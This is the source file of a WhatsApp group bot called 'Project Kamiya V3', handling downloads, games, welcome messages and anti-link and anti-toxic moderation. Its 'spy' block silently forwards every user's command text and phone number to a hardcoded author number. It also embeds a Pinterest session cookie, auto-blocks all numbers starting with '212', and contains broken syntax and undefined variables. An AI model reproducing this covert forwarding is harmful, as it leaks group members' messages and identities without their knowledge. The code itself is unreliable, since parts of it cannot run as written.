require('./len')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys")
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const { apikey } = require('./apikey.json')
const { color, bgcolor } = require('./lib/color')
const { ssweb } = require('./lib/ssweb')
const { quote } = require('./lib/quote')
const { uptotelegra } = require('./lib/upload')
const { Primbon } = require('scrape-primbon')
const { remini } = require('./lib/remini')
const { TelegraPh } = require('./lib/uploader')
const primbon = new Primbon()
const hxz = require('hxz-api')
const jsobfus = require('javascript-obfuscator')
const cheerio = require('cheerio')
const ytdl = require("ytdl-core")
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { exec, spawn, execSync } = require("child_process")
const { mediafireDl } = require('./database/mediafire.js')
const { smsg, tanggal, getTime, formatp, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/addlist');

// read database
global.db.data = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db.data) global.db.data = {
users: {},
chats: {},
game: {},
database: {},
settings: {},
setting: {},
others: {},
sticker: {},
...(global.db.data || {})
}
let tebaklagu = db.data.game.tebaklagu = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let db_respon_list = JSON.parse(fs.readFileSync('./database/list.json'));

const yts = require('./scrape/yt-search')
const { ytSearch } = require('./scrape/yt')
const thumbnail = fs.readFileSync ('./data/image/thumb.jpg')
const thumb = fs.readFileSync ('./data/image/thumb.jpg')
const kalimage = fs.readFileSync ('./data/image/thumb.jpg')
const pengguna = JSON.parse(fs.readFileSync('./database/user.json'))
const owner = JSON.parse(fs.readFileSync('./premium.json'))
const author = JSON.parse(fs.readFileSync('./author.json'))
const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
const docunye = JSON.parse(fs.readFileSync('./database/docu.json'))
const zipnye = JSON.parse(fs.readFileSync('./database/zip.json'))
const apknye = JSON.parse(fs.readFileSync('./database/apk.json'))
const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
const chatbot = JSON.parse(fs.readFileSync("./lib/chatbot.json"))
const antidel = JSON.parse(fs.readFileSync("./lib/antidel.json"))
const banned = JSON.parse(fs.readFileSync('./data/db/banned.json'))
const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))

// Get Database
const isContacts = contacts.includes(m.sender)

module.exports = lenwy = async (lenwy, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype === 'messageContextInfo') ? (m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix


const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()//Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const full_args = body.replace(command, '').slice(1).trim()
const spychat = body.replace().slice().trim()
const pushname = m.pushName || "No Name"
const text = q = args.join(" ")
const { type, quotedMsg, mentioned, now, fromMe } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const botNumber = await lenwy.decodeJid(lenwy.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isOwner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await lenwy.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const AntiLink = m.isGroup ? ntilink.includes(from) : false 
const ChatBot = m.isGroup ? chatbot.includes(from) : false 
const autodelete = from && isCmd ? antidel.includes(from) : false 
const isBan = banned.includes(m.sender)
const isUser = pengguna.includes(m.sender)
const content = JSON.stringify(m.message)
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const Input = mentionByTag[0] ? mentionByTag[0] : q ? numberQuery : false
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const bii = JSON.parse(fs.readFileSync('./data/db/anjay.json').toString())
const isSeler = [botNumber, ...bii].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const qtod = m.quoted? "true":"false"

const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = '❄️️ Selamat Malam'
        }
        if(time2 < "19:00:00"){
        var ucapanWaktu = '❄️️ Selamat Petang'
        }
        if(time2 < "18:00:00"){
        var ucapanWaktu = '❄️️ Selamat Sore'
        }
        if(time2 < "15:00:00"){
        var ucapanWaktu = '❄️️ Selamat Siang'
        }
        if(time2 < "10:00:00"){
        var ucapanWaktu = '❄️️ Selamat Pagi'
        }
        if(time2 < "05:00:00"){
        var ucapanWaktu = '❄️️ Selamat Subuh'
        }
        if(time2 < "03:00:00"){
        var ucapanWaktu = '❄️️ Selamat Tengah Malam'
        }
        
        if (!lenwy.public) {
if (!m.key.fromMe && !isOwner) return
}

const cap = 'LEN'
try {
pplu = await lenwy.profilePictureUrl(anu.id, 'image')
} catch {
pplu = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
const len = {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: `status@broadcast`
                } : {})
            },
            message: {
                "contactMessage": {
                    'displayName': `${pushname}`,
                    'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ProjectKamiya,;;;\nFN: ©Project Kamiya汉 V3\nitem1.TEL;waid=${m.sender.split("@")[0]}:+${m.sender.split("@")[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                    'jpegThumbnail': pplu,
                    thumbnail: pplu,
                    sendEphemeral: true
                }   
            }
        }

const len2 = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
            remoteJid: "status@broadcast"
        } : {})
    },
    message: {
        "extendedTextMessage": {
            "text": ucapanWaktu,
            "title": ``,
            "thumbnailUrl": pplu
        }
    }
}

const reply = (teks) => {
lenwy.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `❄️️ Halo Aku ©Project Kamiya汉 V3`,"body": `Hai kak ${pushname} Jangan Spam Ya`, "previewType": "PHOTO","thumbnail": thumb,"sourceUrl": `https://whatsapp.com/channel/0029VaEvOpP35fLtqPxd4F2L`}}}, { quoted: len })}

const onlygc = () => {
lenwy.sendMessage(m.chat, {
    text: `❄️️ *Hello Im ©Project Kamiya汉 V3*\n⚠️ *Fitur Bot Hanya Bisa Digunakan Didalam Grup*\n\n🎁 *Mau Sc? Ketik Kamiya Di Grup*\n\n❄️️ *Information :*\n⨠ *Version : 1.2*\n⨠ *Author : 「 Kamiya 汉 」*\n⨠ *Author : wa.me/6283829102407*`,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu}`,
        body: "©Project Kamiya汉 V3",
        thumbnailUrl: "https://telegra.ph/file/24f30f85f768682d31915.jpg",
        sourceUrl: "https://chat.whatsapp.com/Idgq0vOKDsQD9cL59RZCf1",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   lenwy.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/private.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: len })
   }
   
try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = global.limitawal.free
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
                if (!isNumber(user.level)) user.level = 0
                if (!('autolevelup' in user)) user.autolevelup = true
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
                level: 0,
                autolevelup: true
            }
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('wlcm' in chats)) chats.wlcm = true
                if (!('nsfw' in chats)) chats.nsfw = false
                if (!('antitoxic' in chats)) chats.antitoxic = false
                if (!('antilink' in chats)) chats.antilink = false
                if (!('antilinkyt' in chats)) chats.antilinkyt = false
                if (!('antilinktt' in chats)) chats.antilinktt = false
                if (!('antivirtex' in chats)) chats.antivirtex = true
                if (!('antipanel' in chats)) chats.antipanel = false
                if (!('antilinkv2' in chats)) chats.antilinkv2 = false
                if (!('autodown' in chats)) chats.autodown = false
                if (!('notification' in chats)) chats.notification = {}
            } else global.db.data.chats[m.chat] = {
                mute: false,
                wlcm: true,
                nsfw: false,
                antitoxic: false,
                antilink: false,
                antilinkyt: false,
                antilinktt: false,
                antivirtex: true,
                antipanel: false,
                antilinkv2: false,
                autodown: false,
                notification: {
                     status: false,
                     text_left: '',
                     text_welcome:''
                  }
            }
            let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
                if (!isNumber(setting.status)) setting.status = 0
                if (!('autobio' in setting)) setting.autobio = false
                if (!('autoread' in setting)) setting.autoread = false
            } else global.db.data.settings[botNumber] = {
                status: 0,
                autobio: false,
                autoread: false
            }

        } catch (err) {
            console.error(err)
        }

let cron = require('node-cron')
        cron.schedule('02 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
        
function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

async function jarak(dari, ke) {
    let html = (await axios(`https://www.google.com/search?q=${encodeURIComponent('jarak ' + dari + ' ke ' + ke)}&hl=id`)).data
    let $ = cheerio.load(html), obj = {}
    let img = html.split("var s=\'")?.[1]?.split("\'")?.[0]
    obj.img = /^data:.*?\/.*?;base64,/i.test(img) ? Buffer.from(img.split`,` [1], 'base64') : ''
    obj.desc = $('div.BNeawe.deIvCb.AP7Wnd').text()?.trim()
    return obj
}

function pinterest(querry){
    return new Promise(async(resolve,reject) => {
         axios.get('https://id.pinterest.com/search/pins/?autologin=true&q=' + querry, {
            headers: {
            "cookie" : "_auth=1; _b=\"AVna7S1p7l1C5I9u0+nR3YzijpvXOPc6d09SyCzO+DcwpersQH36SmGiYfymBKhZcGg=\"; _pinterest_sess=TWc9PSZHamJOZ0JobUFiSEpSN3Z4a2NsMk9wZ3gxL1NSc2k2NkFLaUw5bVY5cXR5alZHR0gxY2h2MVZDZlNQalNpUUJFRVR5L3NlYy9JZkthekp3bHo5bXFuaFZzVHJFMnkrR3lTbm56U3YvQXBBTW96VUgzVUhuK1Z4VURGKzczUi9hNHdDeTJ5Y2pBTmxhc2owZ2hkSGlDemtUSnYvVXh5dDNkaDN3TjZCTk8ycTdHRHVsOFg2b2NQWCtpOWxqeDNjNkk3cS85MkhhSklSb0hwTnZvZVFyZmJEUllwbG9UVnpCYVNTRzZxOXNJcmduOVc4aURtM3NtRFo3STlmWjJvSjlWTU5ITzg0VUg1NGhOTEZzME9SNFNhVWJRWjRJK3pGMFA4Q3UvcHBnWHdaYXZpa2FUNkx6Z3RNQjEzTFJEOHZoaHRvazc1c1UrYlRuUmdKcDg3ZEY4cjNtZlBLRTRBZjNYK0lPTXZJTzQ5dU8ybDdVS015bWJKT0tjTWYyRlBzclpiamdsNmtpeUZnRjlwVGJXUmdOMXdTUkFHRWloVjBMR0JlTE5YcmhxVHdoNzFHbDZ0YmFHZ1VLQXU1QnpkM1FqUTNMTnhYb3VKeDVGbnhNSkdkNXFSMXQybjRGL3pyZXRLR0ZTc0xHZ0JvbTJCNnAzQzE0cW1WTndIK0trY05HV1gxS09NRktadnFCSDR2YzBoWmRiUGZiWXFQNjcwWmZhaDZQRm1UbzNxc21pV1p5WDlabm1UWGQzanc1SGlrZXB1bDVDWXQvUis3elN2SVFDbm1DSVE5Z0d4YW1sa2hsSkZJb1h0MTFpck5BdDR0d0lZOW1Pa2RDVzNySWpXWmUwOUFhQmFSVUpaOFQ3WlhOQldNMkExeDIvMjZHeXdnNjdMYWdiQUhUSEFBUlhUVTdBMThRRmh1ekJMYWZ2YTJkNlg0cmFCdnU2WEpwcXlPOVZYcGNhNkZDd051S3lGZmo0eHV0ZE42NW8xRm5aRWpoQnNKNnNlSGFad1MzOHNkdWtER0xQTFN5Z3lmRERsZnZWWE5CZEJneVRlMDd2VmNPMjloK0g5eCswZUVJTS9CRkFweHc5RUh6K1JocGN6clc1JmZtL3JhRE1sc0NMTFlpMVErRGtPcllvTGdldz0=; _ir=0"
        }
            }).then(({ data }) => {
        const $ = cheerio.load(data)
        const result = [];
        const hasil = [];
         $('div > a').get().map(b => {
        const link = $(b).find('img').attr('src')
            result.push(link)
        });
        result.forEach(v => {
         if(v == undefined) return
         hasil.push(v.replace(/230/g,'730'))
            })
            hasil.shift();
        resolve(hasil)
        })
    })
}

function sort(property, ascending = true) {
  if (property) return (...args) => args[ascending & 1][property] - args[!ascending & 1][property]
  else return (...args) => args[ascending & 1] - args[!ascending & 1]
}

function toNumber(property, _default = 0) {
  if (property) return (a, i, b) => {
    return {...b[i], [property]: a[property] === undefined ? _default : a[property]}
  }
  else return a => a === undefined ? _default : a
}

function enumGetKey(a) {
  return a.jid
}

function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

if (m.sender.startsWith('212')) return lenwy.updateBlockStatus(m.sender, 'block')

if (m.message) {
if (global.db.data.settings[botNumber].autoread) {
lenwy.readMessages([m.key])
}
}

if (command) {
if (!isCreator && !m.isGroup) return onlygc()
lenwy.sendMessage('6283829102407' + "@s.whatsapp.net", { text: `▢ *S P Y - C O M M A N D* 」\n│ ⨠  *From*: ${m.sender.split("@")[0]}\n│ ⨠  *Chat*: ${spychat}\n╰──────────────━` }, { quoted: len });*/
}

if (spychat) {
if (!isCreator && !m.isGroup) return
const { color } = require('./lib/color')
const moment = require("moment-timezone")
let levelling = require('./lib/levelling')
		let user = global.db.data.users[m.sender]
		if (!user.autolevelup) return !0
		let before = user.level * 1
		while (levelling.canLevelUp(user.level, user.exp, global.multiplier)) user.level++
		if (before !== user.level) {
			let chating = `🥳 Congratulations ${pushname}, you have leveled up!
*${before}* -> *${user.level}*
Use *Profile* To Check`
			reply(chating)
			console.log(color(chating, 'pink'))
		}
	}

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await lenwy.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}

function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await lenwy.sendMessage(from, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}

async function LenwyLD () {
var leni = [
"❄️️ *Hello Im ©Project Kamiya汉 V3*",
"❄️️ *Author : Kamiya 汉*",
"❄️️ *Sending Results...*",
]
let { key } = await lenwy.sendMessage(from, {text: '❄️️ *Loading*'},  { quoted: len })

for (let i = 0; i < leni.length; i++) {
await sleep(100)
await lenwy.sendMessage(from, {text: leni[i], edit: key }, { quoted: len });
}
}

if (autodelete) {
lenwy.sendMessage(m.chat, { delete: m.key })
}

if (m.isBaileys && m.fromMe) {
          reply(`*Bot Lain Terdeteksi*\n\n*Bot Akan Di Keluarkan, Karena Admin Mengaktifkan Anti Bot*`)
    await lenwy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
/*let reactionMessage = {
                    react: {
                        text: `👁️‍🗨️`,
                        key: { remoteJid: m.chat, fromMe: true, id: mek.key.id }
                    }
                }
                await sleep(1500)
                lenwy.sendMessage(m.chat, reactionMessage)*/

const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]
if (m.message) {
lenwy.sendPresenceUpdate(from)
console.log(chalk.yellow.bgCyan.bold(botname), color(`⨠ Pesan`, `${randomcolor}`), color(`Dari`, `${randomcolor}`), color(`${pushname}`, `${randomcolor}`), color(` :`, `${randomcolor}`), color(`${body}`, `white`))
}

if (isCmd && !isUser) {
pengguna.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(pengguna, null, 2))
}


if (db.data.chats[m.chat].notification.status) {
            lenwy.ev.on('group-participants.update', async (anu) => {
            //console.log(anu)
               try {
                  let metadata = await lenwy.groupMetadata(anu.id)
                  let par = anu.participants
                  for (let i of par) {
                     let ppuser = await lenwy.profilePictureUrl(i, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
                     if (anu.action == 'add') {
                    lenwy.sendMessage(anu.id, {
     text: db.data.chats[m.chat].notification.text_left ? db.data.chats[m.chat].notification.text_welcome : `❄️ Welcome To ${metadata.subject} | @${sender.split("@")[0]}`, 
      contextInfo: {
         externalAdReply: {
         title: `${botname}`,
         body: `${ownername}`,
         thumbnailUrl: ppuser,
         sourceUrl: "https://linktr.ee/projectskamiya",
         mediaType: 1,
         renderLargerThumbnail: false
    }}})
                        await sleep(100)
                        lenwy.sendMessage(anu.id, { audio: fs.readFileSync('./mp3/welcome.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
                     } else if (anu.action == 'remove') {
                        lenwy.sendMessage(anu.id, {
     text: db.data.chats[m.chat].notification.text_left ? db.data.chats[m.chat].notification.text_left : `❄️️ Selamat Tinggal @${sender.split("@")[0]}`, 
      contextInfo: {
         externalAdReply: {
         title: `${botname}`,
         body: `${ownername}`,
         thumbnailUrl: ppuser,
         sourceUrl: "https://linktr.ee/projectskamiya",
         mediaType: 1,
         renderLargerThumbnail: false
    }}})
                        await sleep(100)
                        lenwy.sendMessage(anu.id, { audio: fs.readFileSync('./mp3/sayonara.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
                     }
                  }
               } catch (err) {
                  console.log(err)
               }
            })
        }


if (db.data.chats[m.chat].antitoxic) {
const isToxic = /(ewe|bangsad|mmk|koncol|puki|kojtol|kintil|momok|nigga|ajg|ewean|yatim|anjing|kontol|memek|bangsat|babi|goblok|goblog|kntl|pepek|ppk|ngentod|ngentd|ngntd|kentod|kntd|bgst|anjg|anj|fuck|hitam|ireng|jawir|gay|asw|ktl|ngentot|ngewe|bokep|bkp)/i;
    if (!m.isGroup) return
    const isAntiToxic = isToxic.exec(m.text)
    if (isAntiToxic && !isCreator) {
    lenwy.sendMessage(m.chat, { delete: m.key })
    await lenwy.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/toxic.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: len })
    }}

// Auto Download
if (db.data.chats[m.chat].autodown) {
if (budy.match('vt.tiktok.com')) {
try {
LenwyLD()
let res = await tiktok2(`${spychat}`)
				lenwy.sendMessage(m.chat, { video: { url: res.no_watermark }, fileName: `tiktok.mp4`, mimetype: 'video/mp4' }).then(() => {
				lenwy.sendMessage(m.chat, { audio: { url: res.music }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
			})
			} catch (err) {
await reply("❄️️ *Error! Harap Kirim Link Tanpa Teks Lain...*\n\n*Support Link https://vt.tiktok.com/*")
}}
if (budy.match('youtu.be')) {
try {
LenwyLD()
			let res = await fetchJson(`https://vihangayt.me/download/ytmp4?url=${spychat}`)
				lenwy.sendMessage(m.chat, { video: { url: res.data.vid_360p }, mimetype: 'video/mp4' })
			} catch (err) {
await reply("❄️️ *Error! Harap Kirim Link Tanpa Teks Lain...*\n\n*Support Link https://youtu.be/*")
}}
if (budy.match('www.instagram.com/p/')) {
try {
LenwyLD()
let res = await fetch(`https://vihangayt.me/download/instagram?url=${spychat}`)
let json = await res.json()
let cap = `*Selesai* 🙌`
let con = json.data.data[0].type
let data = json.data.data[0].url
if (con.includes('video')) {
lenwy.sendMessage(m.chat, { video: { url: data }, caption: cap })
} else {
lenwy.sendMessage(m.chat, { image: { url: data }, caption: cap })
				}
} catch (err) {
console.log(util.format(err))
await reply("❄️️ *Error! Harap Kirim Link Tanpa Teks Lain...*\n\n*Support Link https://www.instagram.com/p/*")
}}
if (budy.match('www.instagram.com/reel/')) {
try {
LenwyLD()
let res = await fetch(`https://vihangayt.me/download/instagram?url=${spychat}`)
let json = await res.json()
let cap = `*Selesai* 🙌`
let con = json.data.data[0].type
let data = json.data.data[0].url
if (con.includes('video')) {
lenwy.sendMessage(m.chat, { video: { url: data }, caption: cap })
} else {
lenwy.sendMessage(m.chat, { image: { url: data }, caption: cap })
				}
} catch (err) {
console.log(util.format(err))
await reply("❄️️ *Error! Harap Kirim Link Tanpa Teks Lain...*\n\n*Support Link https://www.instagram.com/reel/*")
}}
if (budy.match('mediafire.com')) {
try {
    LenwyLD()
	const { mediafireDl } = require('./lib/mediafire.js')
	const baby1 = await mediafireDl(text)
	if (baby1[0].size.split('MB')[0] >= 50) return reply('Oops, the file is too big...')
	const result4 = `*MEDIAFIRE DOWNLOADER*

*▢ Name* : ${baby1[0].nama}
*▢ Size* : ${baby1[0].size}
*▢ Mime* : ${baby1[0].mime}
*▢ Link* : ${baby1[0].link}`
reply(`${result4}`)
rico.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
} catch (err) {
await reply("❄️️ *Error! Harap Kirim Link Tanpa Teks Lain...*")
}}
}

// Anti Link
if (db.data.chats[m.chat].antilink) {
            if (budy.match(`chat.whatsapp.com`)) {
                reply(`*❄️️ Anti Link Whatsapp*\n\n*Kamu Terdeteksi Mengirim Link Group*`)
                if (!isBotAdmins) return reply(`Ehh Bot Bukan Admin T_T`)
                let gclink = (`https://chat.whatsapp.com/` + await lenwy.groupInviteCode(m.chat))
                let isLinkThisGc = new RegExp(gclink, 'i')
                let isgclink = isLinkThisGc.test(m.text)
                if (isgclink) return reply(`Ehh Maaf Gak Jadi, Link Group Ini Ternyata 😆`)
                if (isAdmins) return reply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return reply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                lenwy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
        }
        if (db.data.chats[m.chat].antilinkv2) {
            if (budy.match(`chat.whatsapp.com`)) {
                reply(`*❄️️ Anti Link Whatsapp*\n\n🍁 *Kamu Terdeteksi Mengirim Link Group*`)
                if (!isBotAdmins) return reply(`Ehh Bot Gak Admin T_T`)
                let gclink = (`https://chat.whatsapp.com/` + await lenwy.groupInviteCode(m.chat))
                let isLinkThisGc = new RegExp(gclink, 'i')
                let isgclink = isLinkThisGc.test(m.text)
                if (isgclink) return reply(`Ehh Maaf Gak Jadi, Link Group Ini Ternyata 😆`)
                if (isAdmins) return reply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return reply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                lenwy.sendMessage(m.chat, { delete: m.key })
            }
        }
        //Anti Panel
        if (db.data.chats[m.chat].antipanel) {
            if (budy.match('panel2443417')) {
            reply(`「 *ANTI PROMOSI PANEL* 」\n\nApa? Panel? Beli Di Admin Sini Aja, Yg Lain Jelek, Cepet Down, Lemot, Banyak Masalah!\n\nMau? Chat Ke:\nt.me/Kamiya`)
                if (!isBotAdmins) return reply(`Kan Aku Belum Jadi Admin 🥲`)
                if (isAdmins) return reply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return reply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                lenwy.sendMessage(m.chat, { delete: m.key })}
            if (budy.match('Panel')) {
            reply(`「 *ANTI PROMOSI PANEL* 」\n\nApa? Panel? Beli Di Admin Sini Aja, Yg Lain Jelek, Cepet Down, Lemot, Banyak Masalah!\n\nMau? Chat Ke:\nt.me/Kamiya`)
                if (!isBotAdmins) return reply(`Kan Aku Belum Jadi Admin 🥲`)
                if (isAdmins) return reply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return reply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                lenwy.sendMessage(m.chat, { delete: m.key })}
            if (budy.match('PANEL')) {
                reply(`「 *ANTI PROMOSI PANEL* 」\n\nApa? Panel? Beli Di Admin Sini Aja, Yg Lain Jelek, Cepet Down, Lemot, Banyak Masalah!\n\nMau? Chat Ke:\nt.me/Kamiya`)
                if (!isBotAdmins) return reply(`Kan Aku Belum Jadi Admin 🥲`)
                if (isAdmins) return reply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return reply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                lenwy.sendMessage(m.chat, { delete: m.key })
            }
        }

/*
if (ChatBot) {
if (!m.isGroup) return onlygc()
if (m.message) {
if (!text) return
  let api = await fetchJson(`https://api.itsrose.life/cai/chat?message=${spychat}&character_id=RQrrOj-UNdEV2_PC5D03US-27MZ7EUtaRH_husjbRQA&apikey=Rk-Salsabila`)
  results = api.result.message
  m.reply(result)
  }
}*/

let list = []
for (let i of owner) {
list.push({
displayName: await lenwy.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await lenwy.getName(i + '@s.whatsapp.net')}\n
FN:${await lenwy.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:FakeKamiya@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:Youtube : Kamiya\n
item3.X-ABLabel:Grup ProjectKamiya\n
item4.ADR:;;Mars Area 51;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: lenwy.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
